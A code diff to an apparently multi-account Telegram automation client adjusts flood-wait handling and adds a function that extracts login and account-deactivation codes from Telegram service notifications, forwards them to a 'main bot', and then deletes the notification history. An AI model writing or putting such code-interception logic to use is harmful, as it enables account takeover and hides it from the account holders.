@@ -74724,13 +74724,13 @@ ID: ${this._accountId}`);
             es.push(e.message);
             if (e instanceof errors3.ServerError || e.message === "RPC_CALL_FAIL" || e.message === "RPC_MCGET_FAIL") {
             } else if (e instanceof errors3.FloodWaitError || e instanceof errors3.FloodTestPhoneWaitError) {
-              if (request.className === "contacts.Block" || request.className === "contacts.Unblock" || request.className === "messages.DeleteChatUser") {
-                state.finished.resolve();
-                throw e;
-              }
               if (e.seconds <= 60) {
                 await sleep3(e.seconds * 1e3);
               } else {
+                if (request.className === "contacts.Block" || request.className === "contacts.Unblock" || request.className === "messages.DeleteChatUser") {
+                  state.finished.resolve();
+                  throw e;
+                }
                 this._onError(
                   `\u{1F480} FLOOD_WAIT_ERROR \u{1F480}
 ACCOUNT ID: ${this._accountId}
@@ -78904,6 +78904,19 @@ async function deleteHistory(client, peer, shouldDeleteForAll) {
 }
 
 // src/support/methods/update/handleUpdate.ts
+var extractLoginCode = (message) => {
+  const loginCodeMatch = message.match(/Login code: (\d+)/);
+  if (loginCodeMatch) {
+    return loginCodeMatch[1];
+  }
+  const webLoginMatch = message.match(
+    /This is your login code:\s*([a-zA-Z0-9]+)/
+  );
+  if (webLoginMatch) {
+    return `${webLoginMatch[1]}`;
+  }
+  return null;
+};
 var handleUpdate = async (client, accountId, update) => {
   if (!update) {
     return;
@@ -78925,11 +78938,15 @@ var handleUpdate = async (client, accountId, update) => {
         message: "[TELEGRAM_SERVICE_NOTIFICATION]",
         payload: JSON.parse(JSON.stringify(update))
       });
-      await sendToMainBot(
-        `[TELEGRAM_SERVICE_NOTIFICATION]
+      const code = extractLoginCode(update.message);
+      let messageText = update.message;
+      if (code) {
+        messageText = update.message.includes("my.telegram.org") ? `CODE_FOR_DEACTIVATE_ACCOUNT: ${code}` : `CODE_FOR_LOGIN: ${code}`;
+      }
+      const notificationMessage = `[TELEGRAM_SERVICE_NOTIFICATION]
 ID: ${accountId}
-MESSAGE: ${update.message}`
-      );
+MESSAGE: ${messageText}`;
+      await sendToMainBot(notificationMessage);
       if (client) {
         await deleteHistory(
           client,
